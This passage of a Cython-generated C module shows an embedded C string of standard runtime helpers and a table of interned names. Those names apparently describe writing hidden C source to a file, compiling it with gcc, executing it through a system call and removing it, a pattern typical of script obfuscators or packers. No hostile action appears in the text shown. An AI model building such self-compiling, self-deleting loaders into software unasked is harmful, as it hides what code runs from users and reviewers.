((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\\n                        }\\n                    }\\n                    break;\\n                case -4:\\n                    if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {\\n                        if (8 * sizeof(unsigned lon\"\"g) > 4 * PyLong_SHIFT) {\\n                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits""[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\n                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {\\n                            return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\\n                        }\\n                    }\\n                    break;\\n                case 4:\\n                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {\\n                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\n                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {\\n                            return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\\n                        }\\n                    }\\n                    break;\\n            }\\n#endif\\n            if (sizeof(int) <= sizeof(long)) {\\n                __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))\\n#ifdef HAVE_LONG_LONG\\n            } else if (sizeof(int) <= sizeof(PY_LONG_LONG)) {\\n                __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))\\n#endif\\n            }\\n        }\\n        {\\n#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)\\n            PyErr_SetString(PyExc_RuntimeError,\\n                            \\\"_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers\\\");\\n#else\\n            int val;\\n            PyObject *v = __Pyx_PyNumb\"\"er_IntOrLong(x);\\n #if PY_MAJOR_VERSION < 3\\n            if (likely(v) && !PyLong_Check(v)) {\\n                PyObject *tmp = v;""\\n                v = PyNumber_Long(tmp);\\n                Py_DECREF(tmp);\\n            }\\n #endif\\n            if (likely(v)) {\\n                int one = 1; int is_little = (int)*(unsigned char *)&one;\\n                unsigned char *bytes = (unsigned char *)&val;\\n                int ret = _PyLong_AsByteArray((PyLongObject *)v,\\n                                              bytes, sizeof(val),\\n                                              is_little, !is_unsigned);\\n                Py_DECREF(v);\\n                if (likely(!ret))\\n                    return val;\\n            }\\n#endif\\n            return (int) -1;\\n        }\\n    } else {\\n        int val;\\n        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);\\n        if (!tmp) return (int) -1;\\n        val = __Pyx_PyInt_As_int(tmp);\\n        Py_DECREF(tmp);\\n        return val;\\n    }\\nraise_overflow:\\n    PyErr_SetString(PyExc_OverflowError,\\n        \\\"value too large to convert to int\\\");\\n    return (int) -1;\\nraise_neg_overflow:\\n    PyErr_SetString(PyExc_OverflowError,\\n        \\\"can't convert negative value to int\\\");\\n    return (int) -1;\\n}\\n\\n/* FastTypeChecks */\\n    #if CYTHON_COMPILING_IN_CPYTHON\\nstatic int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {\\n    while (a) {\\n        a = a->tp_base;\\n        if (a == b)\\n            return 1;\\n    }\\n    return b == &PyBaseObject_Type;\\n}\\nstatic CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b) {\\n    PyObject *mro;\\n    if (a == b) return 1;\\n    mro = a->tp_mro;\\n    if (likely(mro)) {\\n        Py_ssize_t i, n;\\n        n = PyTuple_GET_SIZE(mro);\\n        for (i = 0; i < n; i++) {\\n            if (PyTuple_GET_ITEM(mro, i) == (PyObject *)b)\\n                return 1;\\n        }\\n        return 0;\\n    }\\n    return __Pyx_InBases(a, b);\\n}\\n#if PY_MAJOR_VERSION == 2\\nstatic int __Pyx_inner_PyErr_GivenExcep\"\"tionMatches2(PyObject *err, PyObject* exc_type1, PyObje""ct* exc_type2) {\\n    PyObject *exception, *value, *tb;\\n    int res;\\n    __Pyx_PyThreadState_declare\\n    __Pyx_PyThreadState_assign\\n    __Pyx_ErrFetch(&exception, &value, &tb);\\n    res = exc_type1 ? PyObject_IsSubclass(err, exc_type1) : 0;\\n    if (unlikely(res == -1)) {\\n        PyErr_WriteUnraisable(err);\\n        res = 0;\\n    }\\n    if (!res) {\\n        res = PyObject_IsSubclass(err, exc_type2);\\n        if (unlikely(res == -1)) {\\n            PyErr_WriteUnraisable(err);\\n            res = 0;\\n        }\\n    }\\n    __Pyx_ErrRestore(exception, value, tb);\\n    return res;\\n}\\n#else\\nstatic CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {\\n    int res = exc_type1 ? __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type1) : 0;\\n    if (!res) {\\n        res = __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);\\n    }\\n    return res;\\n}\\n#endif\\nstatic int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {\\n    Py_ssize_t i, n;\\n    assert(PyExceptionClass_Check(exc_type));\\n    n = PyTuple_GET_SIZE(tuple);\\n#if PY_MAJOR_VERSION >= 3\\n    for (i=0; i<n; i++) {\\n        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;\\n    }\\n#endif\\n    for (i=0; i<n; i++) {\\n        PyObject *t = PyTuple_GET_ITEM(tuple, i);\\n        #if PY_MAJOR_VERSION < 3\\n        if (likely(exc_type == t)) return 1;\\n        #endif\\n        if (likely(PyExceptionClass_Check(t))) {\\n            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;\\n        } else {\\n        }\\n    }\\n    return 0;\\n}\\nstatic CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {\\n    if (likely(err == exc_type)) return 1;\\n    if (likely(PyExceptionClass_Check(err))) {\\n        if (likely(PyExceptionClass_Check(exc_type))) {\\n            return __Pyx_inner_PyErr_GivenExceptionMatches2(""\"\"err, NULL, exc_type);\\n        } else if (likely(PyTuple_Check(exc_type))) {\\n            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);\\n        } else {\\n        }\\n    }\\n    return PyErr_GivenExceptionMatches(err, exc_type);\\n}\\nstatic CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc_type1, PyObject *exc_type2) {\\n    assert(PyExceptionClass_Check(exc_type1));\\n    assert(PyExceptionClass_Check(exc_type2));\\n    if (likely(err == exc_type1 || err == exc_type2)) return 1;\\n    if (likely(PyExceptionClass_Check(err))) {\\n        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);\\n    }\\n    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));\\n}\\n#endif\\n\\n/* CheckBinaryVersion */\\n    static int __Pyx_check_binary_version(void) {\\n    char ctversion[5];\\n    int same=1, i, found_dot;\\n    const char* rt_from_call = Py_GetVersion();\\n    PyOS_snprintf(ctversion, 5, \\\"%d.%d\\\", PY_MAJOR_VERSION, PY_MINOR_VERSION);\\n    found_dot = 0;\\n    for (i = 0; i < 4; i++) {\\n        if (!ctversion[i]) {\\n            same = (rt_from_call[i] < '0' || rt_from_call[i] > '9');\\n            break;\\n        }\\n        if (rt_from_call[i] != ctversion[i]) {\\n            same = 0;\\n            break;\\n        }\\n    }\\n    if (!same) {\\n        char rtversion[5] = {'\\\\0'};\\n        char message[200];\\n        for (i=0; i<4; ++i) {\\n            if (rt_from_call[i] == '.') {\\n                if (found_dot) break;\\n                found_dot = 1;\\n            } else if (rt_from_call[i] < '0' || rt_from_call[i] > '9') {\\n                break;\\n            }\\n            rtversion[i] = rt_from_call[i];\\n        }\\n        PyOS_snprintf(message, sizeof(message),\\n                      \\\"compiletime version %s of module '%.100s' \\\"\\n                      \\\"does not match runtime version %s\\\",\\n           ""           ctversion, __Pyx_MODULE_NAME, rtversion);\\n        return \"\"PyErr_WarnEx(NULL, message, 1);\\n    }\\n    return 0;\\n}\\n\\n/* InitStrings */\\n    static int __Pyx_InitStrings(__Pyx_StringTabEntry *t) {\\n    while (t->p) {\\n        #if PY_MAJOR_VERSION < 3\\n        if (t->is_unicode) {\\n            *t->p = PyUnicode_DecodeUTF8(t->s, t->n - 1, NULL);\\n        } else if (t->intern) {\\n            *t->p = PyString_InternFromString(t->s);\\n        } else {\\n            *t->p = PyString_FromStringAndSize(t->s, t->n - 1);\\n        }\\n        #else\\n        if (t->is_unicode | t->is_str) {\\n            if (t->intern) {\\n                *t->p = PyUnicode_InternFromString(t->s);\\n            } else if (t->encoding) {\\n                *t->p = PyUnicode_Decode(t->s, t->n - 1, t->encoding, NULL);\\n            } else {\\n                *t->p = PyUnicode_FromStringAndSize(t->s, t->n - 1);\\n            }\\n        } else {\\n            *t->p = PyBytes_FromStringAndSize(t->s, t->n - 1);\\n        }\\n        #endif\\n        if (!*t->p)\\n            return -1;\\n        if (PyObject_Hash(*t->p) == -1)\\n            return -1;\\n        ++t;\\n    }\\n    return 0;\\n}\\n\\nstatic CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {\\n    return __Pyx_PyUnicode_FromStringAndSize(c_str, (Py_ssize_t)strlen(c_str));\\n}\\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {\\n    Py_ssize_t ignore;\\n    return __Pyx_PyObject_AsStringAndSize(o, &ignore);\\n}\\n#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT\\n#if !CYTHON_PEP393_ENABLED\\nstatic const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {\\n    char* defenc_c;\\n    PyObject* defenc = _PyUnicode_AsDefaultEncodedString(o, NULL);\\n    if (!defenc) return NULL;\\n    defenc_c = PyBytes_AS_STRING(defenc);\\n#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\\n    {\\n        char* end = defenc_c + PyBy""tes_GET_SIZE(defenc);\\n        char* c;\\n        for (c = defenc_c; c < end; c++) {\\n            if ((unsigned char) (*c) >= 128\"\") {\\n                PyUnicode_AsASCIIString(o);\\n                return NULL;\\n            }\\n        }\\n    }\\n#endif\\n    *length = PyBytes_GET_SIZE(defenc);\\n    return defenc_c;\\n}\\n#else\\nstatic CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {\\n    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;\\n#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\\n    if (likely(PyUnicode_IS_ASCII(o))) {\\n        *length = PyUnicode_GET_LENGTH(o);\\n        return PyUnicode_AsUTF8(o);\\n    } else {\\n        PyUnicode_AsASCIIString(o);\\n        return NULL;\\n    }\\n#else\\n    return PyUnicode_AsUTF8AndSize(o, length);\\n#endif\\n}\\n#endif\\n#endif\\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {\\n#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT\\n    if (\\n#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\\n            __Pyx_sys_getdefaultencoding_not_ascii &&\\n#endif\\n            PyUnicode_Check(o)) {\\n        return __Pyx_PyUnicode_AsStringAndSize(o, length);\\n    } else\\n#endif\\n#if (!CYTHON_COMPILING_IN_PYPY) || (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE))\\n    if (PyByteArray_Check(o)) {\\n        *length = PyByteArray_GET_SIZE(o);\\n        return PyByteArray_AS_STRING(o);\\n    } else\\n#endif\\n    {\\n        char* result;\\n        int r = PyBytes_AsStringAndSize(o, &result, length);\\n        if (unlikely(r < 0)) {\\n            return NULL;\\n        } else {\\n            return result;\\n        }\\n    }\\n}\\nstatic CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {\\n   int is_true = x == Py_True;\\n   if (is_true | (x == Py_False) | (x == Py_None)) return is_true;\\n   else return PyObject_IsTrue(x);\\n}\\nstatic CYTHON_I""NLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject* x) {\\n    int retval;\\n    if (unlikely(!x)) return -1;\\n    retval = __Pyx_PyObject_IsTrue(x);\\n    Py_DECREF(x);\\n    return retval;\\n}\\nsta\"\"tic PyObject* __Pyx_PyNumber_IntOrLongWrongResultType(PyObject* result, const char* type_name) {\\n#if PY_MAJOR_VERSION >= 3\\n    if (PyLong_Check(result)) {\\n        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,\\n                \\\"__int__ returned non-int (type %.200s).  \\\"\\n                \\\"The ability to return an instance of a strict subclass of int \\\"\\n                \\\"is deprecated, and may be removed in a future version of Python.\\\",\\n                Py_TYPE(result)->tp_name)) {\\n            Py_DECREF(result);\\n            return NULL;\\n        }\\n        return result;\\n    }\\n#endif\\n    PyErr_Format(PyExc_TypeError,\\n                 \\\"__%.4s__ returned non-%.4s (type %.200s)\\\",\\n                 type_name, type_name, Py_TYPE(result)->tp_name);\\n    Py_DECREF(result);\\n    return NULL;\\n}\\nstatic CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x) {\\n#if CYTHON_USE_TYPE_SLOTS\\n  PyNumberMethods *m;\\n#endif\\n  const char *name = NULL;\\n  PyObject *res = NULL;\\n#if PY_MAJOR_VERSION < 3\\n  if (likely(PyInt_Check(x) || PyLong_Check(x)))\\n#else\\n  if (likely(PyLong_Check(x)))\\n#endif\\n    return __Pyx_NewRef(x);\\n#if CYTHON_USE_TYPE_SLOTS\\n  m = Py_TYPE(x)->tp_as_number;\\n  #if PY_MAJOR_VERSION < 3\\n  if (m && m->nb_int) {\\n    name = \\\"int\\\";\\n    res = m->nb_int(x);\\n  }\\n  else if (m && m->nb_long) {\\n    name = \\\"long\\\";\\n    res = m->nb_long(x);\\n  }\\n  #else\\n  if (likely(m && m->nb_int)) {\\n    name = \\\"int\\\";\\n    res = m->nb_int(x);\\n  }\\n  #endif\\n#else\\n  if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {\\n    res = PyNumber_Int(x);\\n  }\\n#endif\\n  if (likely(res)) {\\n#if PY_MAJOR_VERSION < 3\\n    if (unlikely(!PyInt_Check(res) && !PyLong_Check(r""es))) {\\n#else\\n    if (unlikely(!PyLong_CheckExact(res))) {\\n#endif\\n        return __Pyx_PyNumber_IntOrLongWrongResultType(res, name);\\n    }\\n  }\\n  else if (!PyErr_Occurred()) {\\n    PyErr_SetString(PyExc_TypeError,\\n                    \\\"an integer is required\\\");\\n  }\\n  return res\"\";\\n}\\nstatic CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject* b) {\\n  Py_ssize_t ival;\\n  PyObject *x;\\n#if PY_MAJOR_VERSION < 3\\n  if (likely(PyInt_CheckExact(b))) {\\n    if (sizeof(Py_ssize_t) >= sizeof(long))\\n        return PyInt_AS_LONG(b);\\n    else\\n        return PyInt_AsSsize_t(b);\\n  }\\n#endif\\n  if (likely(PyLong_CheckExact(b))) {\\n    #if CYTHON_USE_PYLONG_INTERNALS\\n    const digit* digits = ((PyLongObject*)b)->ob_digit;\\n    const Py_ssize_t size = Py_SIZE(b);\\n    if (likely(__Pyx_sst_abs(size) <= 1)) {\\n        ival = likely(size) ? digits[0] : 0;\\n        if (size == -1) ival = -ival;\\n        return ival;\\n    } else {\\n      switch (size) {\\n         case 2:\\n           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {\\n             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\\n           }\\n           break;\\n         case -2:\\n           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {\\n             return -(Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\\n           }\\n           break;\\n         case 3:\\n           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {\\n             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\\n           }\\n           break;\\n         case -3:\\n           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {\\n             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\\n           }\\n           break;\\n         case 4:\\n           if (8 * sizeof(Py_ssi""ze_t) > 4 * PyLong_SHIFT) {\\n             return (Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\\n           }\\n           break;\\n         case -4:\\n           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {\\n             return -(Py_ssize_t\"\") (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\\n           }\\n           break;\\n      }\\n    }\\n    #endif\\n    return PyLong_AsSsize_t(b);\\n  }\\n  x = PyNumber_Index(b);\\n  if (!x) return -1;\\n  ival = PyInt_AsSsize_t(x);\\n  Py_DECREF(x);\\n  return ival;\\n}\\nstatic CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject* o) {\\n  if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {\\n    return (Py_hash_t) __Pyx_PyIndex_AsSsize_t(o);\\n#if PY_MAJOR_VERSION < 3\\n  } else if (likely(PyInt_CheckExact(o))) {\\n    return PyInt_AS_LONG(o);\\n#endif\\n  } else {\\n    Py_ssize_t ival;\\n    PyObject *x;\\n    x = PyNumber_Index(o);\\n    if (!x) return -1;\\n    ival = PyInt_AsLong(x);\\n    Py_DECREF(x);\\n    return ival;\\n  }\\n}\\nstatic CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b) {\\n  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);\\n}\\nstatic CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t ival) {\\n    return PyInt_FromSize_t(ival);\\n}\\n\\n\\n#endif /* Py_PYTHON_H */\";\nstatic PyObject *__pyx_kp_u_;\nstatic PyObject *__pyx_n_s_COMPILE_FILE;\nstatic PyObject *__pyx_n_s_C_FILE;\nstatic PyObject *__pyx_n_s_C_SOURCE;\nstatic PyObject *__pyx_n_s_EXECUTE_FILE;\nstatic PyObject *__pyx_n_s_EXPORT_PYTHONHOME;\nstatic PyObject *__pyx_n_s_EXPORT_PYTHON_EXECUTABLE;\nstatic PyObject *__pyx_kp_u_L;\nstatic PyObject *__pyx_n_s_PREFIX;\nstatic PyObject *__pyx_n_s_PSH_TEAM_KEY;\nstatic PyObject *__pyx_n_s_PYTHON_VERSION;\nstatic PyObject *__pyx_kp_u_PY_PRIVATE_20240909130901773;\nstatic"" PyObject *__pyx_n_s_RUN;\nstatic PyObject *__pyx_kp_u__2;\nstatic PyObject *__pyx_kp_u__3;\nstatic PyObject *__pyx_kp_u__5;\nstatic PyObject *__pyx_kp_u__6;\nstatic PyObject *__pyx_n_s_cline_in_traceback;\nstatic PyObject *__pyx_n_s_dirname;\nstatic PyObject *__pyx_n_s_enter;\nstatic PyObject *__pyx_n_s_executable;\nstatic PyObject *__pyx_n_s_exist_ok;\nstatic PyObject *__pyx_n_s_exit;\nstatic PyObject *__pyx_n_s_exit_2;\nstatic PyObject *__pyx_kp_u_export_PYTHONHOME;\nstatic PyObject *__pyx_kp_u_export_PYTHON_EXECUTABLE;\nstatic PyObject *__pyx_n_s_f;\nstatic PyObject *__pyx_kp_u_gcc_I;\nstatic PyObject *__pyx_kp_u_ifndef_PY_SSIZE_T_CLEAN_define;\nstatic PyObject *__pyx_n_s_import;\nstatic PyObject *__pyx_kp_u_include_python;\nstatic PyObject *__pyx_n_s_isfile;\nstatic PyObject *__pyx_kp_u_lib_lpython;\nstatic PyObject *__pyx_n_s_main;\nstatic PyObject *__pyx_n_s_makedirs;\nstatic PyObject *__pyx_n_s_name;\nstatic PyObject *__pyx_kp_u_o;\nstatic PyObject *__pyx_n_s_open;\nstatic PyObject *__pyx_n_s_os;\nstatic PyObject *__pyx_n_s_path;\nstatic PyObject *__pyx_n_s_prefix;\nstatic PyObject *__pyx_kp_u_py_private_c;\nstatic PyObject *__pyx_n_s_remove;\nstatic PyObject *__pyx_n_s_split;\nstatic PyObject *__pyx_n_s_sys;\nstatic PyObject *__pyx_n_s_system;\nstatic PyObject *__pyx_n_s_test;\nstatic PyObject *__pyx_n_s_version;\nstatic PyObject *__pyx_n_u_w;\nstatic PyObject *__pyx_n_s_write;\nstatic PyObject *__pyx_int_0;\nstatic PyObject *__pyx_int_neg_1;\nstatic PyObject *__pyx_slice__9;\nstatic PyObject *__pyx_tuple__4;\nstatic PyObject *__pyx_tuple__7;\nstatic PyObject *__pyx_tuple__8;\nstatic PyObject *__pyx_tuple__10;\n/* Late includes */\n\nstatic PyMethodDef __pyx_methods[] = {\n  {0, 0, 0, 0}\n};\n\n#if PY_MAJOR_VERSION >= 3\n#if CYTHON_PEP489_MULTI_PHASE_INIT\nstatic PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def); /*proto*/\nstatic int __pyx_pymod_exec_source(PyObject* module); /*proto*/\nstatic PyModuleDef_Slot __pyx_moduledef_slots[] = {\n  {P""y_mod_create, (void*)__pyx_pymod_create},\n  {Py_mod_exec, (void*)__pyx_pymod_exec_source},\n  {0, NULL}\n};\n#endif\n\nstatic struct PyModuleDef __pyx_moduledef = {\n    PyModuleDef_HEAD_INIT,\n    \"source\",\n    0, /* m_doc */\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\n    0, /* m_size */\n  #else\n    -1, /* m_size */\n  #endif\n    __pyx_methods /* m_methods */,\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\n    __pyx_moduledef_slots, /* m_slots */\n  #else\n    NULL, /* m_reload */\n  #endif\n    NULL, /* m_traverse */\n    NULL, /* m_clear */\n    NULL /* m_free */\n};\n#endif\n#ifndef CYTHON_SMALL_CODE\n#if defined(__clang__)\n    #define CYTHON_SMALL_CODE\n#elif defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 3))\n    #define CYTHON_SMALL_CODE __attribute__((cold))\n#else\n    #define CYTHON_SMALL_CODE\n#endif\n#endif\n\nstatic __Pyx_StringTabEntry __pyx_string_tab[] = {\n  {&__pyx_kp_u_, __pyx_k_, sizeof(__pyx_k_), 0, 1, 0, 0},\n  {&__pyx_n_s_COMPILE_FILE, __pyx_k_COMPILE_FILE, sizeof(__pyx_k_COMPILE_FILE), 0, 0, 1, 1},\n  {&__pyx_n_s_C_FILE, __pyx_k_C_FILE, sizeof(__pyx_k_C_FILE), 0, 0, 1, 1},\n  {&__pyx_n_s_C_SOURCE, __pyx_k_C_SOURCE, sizeof(__pyx_k_C_SOURCE), 0, 0, 1, 1},\n  {&__pyx_n_s_EXECUTE_FILE, __pyx_k_EXECUTE_FILE, sizeof(__pyx_k_EXECUTE_FILE), 0, 0, 1, 1},\n  {&__pyx_n_s_EXPORT_PYTHONHOME, __pyx_k_EXPORT_PYTHONHOME, sizeof(__pyx_k_EXPORT_PYTHONHOME), 0, 0, 1, 1},\n  {&__pyx_n_s_EXPORT_PYTHON_EXECUTABLE, __pyx_k_EXPORT_PYTHON_EXECUTABLE, sizeof(__pyx_k_EXPORT_PYTHON_EXECUTABLE), 0, 0, 1, 1},\n  {&__pyx_kp_u_L, __pyx_k_L, sizeof(__pyx_k_L), 0, 1, 0, 0},\n  {&__pyx_n_s_PREFIX, __pyx_k_PREFIX, sizeof(__pyx_k_PREFIX), 0, 0, 1, 1},\n  {&__pyx_n_s_PSH_TEAM_KEY, __pyx_k_PSH_TEAM_KEY, sizeof(__pyx_k_PSH_TEAM_KEY), 0, 0, 1, 1},\n  {&__pyx_n_s_PYTHON_VERSION, __pyx_k_PYTHON_VERSION, sizeof(__pyx_k_PYTHON_VERSION), 0, 0, 1, 1},\n  {&__pyx_kp_u_PY_PRIVATE_20240909130901773, __pyx_k_PY_PRIVATE_20240909130901773, sizeof(__pyx_k_PY_PRIVATE_202409""09130901773), 0, 1, 0, 0},\n  {&__pyx_n_s_RUN, __pyx_k_RUN, sizeof(__pyx_k_RUN), 0, 0, 1, 1},\n  {&__pyx_kp_u__2, __pyx_k__2, sizeof(__pyx_k__2), 0, 1, 0, 0},\n  {&__pyx_kp_u__3, __pyx_k__3, sizeof(__pyx_k__3), 0, 1, 0, 0},\n  {&__pyx_kp_u__5, __pyx_k__5, sizeof(__pyx_k__5), 0, 1, 0, 0},\n  {&__pyx_kp_u__6, __pyx_k__6, sizeof(__pyx_k__6), 0, 1, 0, 0},\n  {&__pyx_n_s_cline_in_traceback, __pyx_k_cline_in_traceback, sizeof(__pyx_k_cline_in_traceback), 0, 0, 1, 1},\n  {&__pyx_n_s_dirname, __pyx_k_dirname, sizeof(__pyx_k_dirname), 0, 0, 1, 1},\n  {&__pyx_n_s_enter, __pyx_k_enter, sizeof(__pyx_k_enter), 0, 0, 1, 1},\n  {&__pyx_n_s_executable, __pyx_k_executable, sizeof(__pyx_k_executable), 0, 0, 1, 1},\n  {&__pyx_n_s_exist_ok, __pyx_k_exist_ok, sizeof(__pyx_k_exist_ok), 0, 0, 1, 1},\n  {&__pyx_n_s_exit, __pyx_k_exit, sizeof(__pyx_k_exit), 0, 0, 1, 1},\n  {&__pyx_n_s_exit_2, __pyx_k_exit_2, sizeof(__pyx_k_exit_2), 0, 0, 1, 1},\n  {&__pyx_kp_u_export_PYTHONHOME, __pyx_k_export_PYTHONHOME, sizeof(__pyx_k_export_PYTHONHOME), 0, 1, 0, 0},\n  {&__pyx_kp_u_export_PYTHON_EXECUTABLE, __pyx_k_export_PYTHON_EXECUTABLE, sizeof(__pyx_k_export_PYTHON_EXECUTABLE), 0, 1, 0, 0},\n  {&__pyx_n_s_f, __pyx_k_f, sizeof(__pyx_k_f), 0, 0, 1, 1},\n  {&__pyx_kp_u_gcc_I, __pyx_k_gcc_I, sizeof(__pyx_k_gcc_I), 0, 1, 0, 0},\n  {&__pyx_kp_u_ifndef_PY_SSIZE_T_CLEAN_define, __pyx_k_ifndef_PY_SSIZE_T_CLEAN_define, sizeof(__pyx_k_ifndef_PY_SSIZE_T_CLEAN_define), 0, 1, 0, 0},\n  {&__pyx_n_s_import, __pyx_k_import, sizeof(__pyx_k_import), 0, 0, 1, 1},\n  {&__pyx_kp_u_include_python, __pyx_k_include_python, sizeof(__pyx_k_include_python), 0, 1, 0, 0},\n  {&__pyx_n_s_isfile, __pyx_k_isfile, sizeof(__pyx_k_isfile), 0, 0, 1, 1},\n  {&__pyx_kp_u_lib_lpython, __pyx_k_lib_lpython, sizeof(__pyx_k_lib_lpython), 0, 1, 0, 0},\n  {&__pyx_n_s_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 0, 1, 1},\n  {&__pyx_n_s_makedirs, __pyx_k_makedirs, sizeof(__pyx_k_makedirs), 0, 0, 1, 1},\n  {&__pyx_n_s_name, __pyx_k_name, sizeof(__""pyx_k_name), 0, 0, 1, 1},\n  {&__pyx_kp_u_o, __pyx_k_o, sizeof(__pyx_k_o), 0, 1, 0, 0},\n  {&__pyx_n_s_open, __pyx_k_open, sizeof(__pyx_k_open), 0, 0, 1, 1},\n  {&__pyx_n_s_os, __pyx_k_os, sizeof(__pyx_k_os), 0, 0, 1, 1},\n  {&__pyx_n_s_path, __pyx_k_path, sizeof(__pyx_k_path), 0, 0, 1, 1},\n  {&__pyx_n_s_prefix, __pyx_k_prefix, sizeof(__pyx_k_prefix), 0, 0, 1, 1},\n  {&__pyx_kp_u_py_private_c, __pyx_k_py_private_c, sizeof(__pyx_k_py_private_c), 0, 1, 0, 0},\n  {&__pyx_n_s_remove, __pyx_k_remove, sizeof(__pyx_k_remove), 0, 0, 1, 1},\n  {&__pyx_n_s_split, __pyx_k_split, sizeof(__pyx_k_split), 0, 0, 1, 1},\n  {&__pyx_n_s_sys, __pyx_k_sys, sizeof(__pyx_k_sys), 0, 0, 1, 1},\n  {&__pyx_n_s_system, __pyx_k_system, sizeof(__pyx_k_system), 0, 0, 1, 1},\n  {&__pyx_n_s_test, __pyx_k_test, sizeof(__pyx_k_test), 0, 0, 1, 1},\n  {&__pyx_n_s_version, __pyx_k_version, sizeof(__pyx_k_version), 0, 0, 1, 1},\n  {&__pyx_n_u_w, __pyx_k_w, sizeof(__pyx_k_w), 0, 1, 0, 1},\n  {&__pyx_n_s_write, __pyx_k_write, sizeof(__pyx_k_write), 0, 0, 1, 1},\n  {0, 0, 0, 0, 0, 0, 0}\n};\nstatic CYTHON_SMALL_CODE int __Pyx_InitCachedBuiltins(void) {\n  __pyx_builtin_exit = 